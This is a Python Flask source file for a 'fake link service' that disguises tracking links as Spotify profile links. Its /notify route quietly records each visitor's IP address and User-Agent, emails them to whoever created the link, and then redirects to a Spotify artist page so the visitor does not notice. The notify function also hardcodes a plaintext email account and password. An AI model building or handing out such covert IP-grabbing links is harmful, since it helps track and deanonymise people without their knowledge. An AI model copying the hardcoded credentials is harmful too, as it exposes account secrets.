from flask import Flask, render_template, request, redirect
#import pyrebase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import base64


app = Flask(__name__)

def notify(reciever, message, title):
    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    server.ehlo()
    server.starttls()
    gmail_sender = "efeakaroz@outlook.com"
    gmail_passwd = "efeZeynep123"

    message = "Subject: {}\n\n{}".format(title, message)
    server.login(gmail_sender, gmail_passwd)

    server.sendmail(gmail_sender, reciever,
                    message.encode("utf-8"))


class Openspotify:
    

    @app.route("/")
    def index():
        return render_template("index.html")

    @app.route("/create_session")
    def create_session():
        email = request.args.get("email")
        realspotifylink = request.args.get("URL")
        notify(
            email,
            "We created your fake link we will email all views which comes to your profile!\n\n"
            + str({"email": email, "reallink": realspotifylink}),
            "Kentel fake link service",
        )
        return {"done": True}

    @app.route("/notify")
    def notifier():
        email = request.args.get("email")
        useragent = request.headers.get('User-Agent')
        ipadd = request.environ.get('HTTP_X_FORWARDED_FOR')
        notify(email,f"PHONE:{useragent} \n IP:{ipadd}","NEW PROFILE VISIT - KENTEL PROFILE SERVICE")
        return redirect("https://open.spotify.com/artist/1ZwdS5xdxEREPySFridCfh")
@app.route("/about")
def about():
    return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>About</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
            <link rel="shortcut icon" href="/static/rocket.png" type="">
        </head>
        <body>
            <nav class="navbar navbar-dark " style="background-color: rgb(55, 192, 1);">
                <a class="navbar-brand" href="/" >
                <img style="margin-left:10px;margin-right: 10px;"src="/static/rocket.png" width="30" height="30" class="d-inline-block align-top" alt="">
                OpenSpotify-13
                </a>
            </nav>
            <div class="container"><br><br>
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">About</h5>
                            <p class="card-text">Hello I am the developer of this project, the reason that i wrote this application is making some notifier links for seeing who clicked to the link at my profile. You can use it for free! </p>
                            
                        </div>
                    </div>
            </div>
        </body>
        </html>
    """


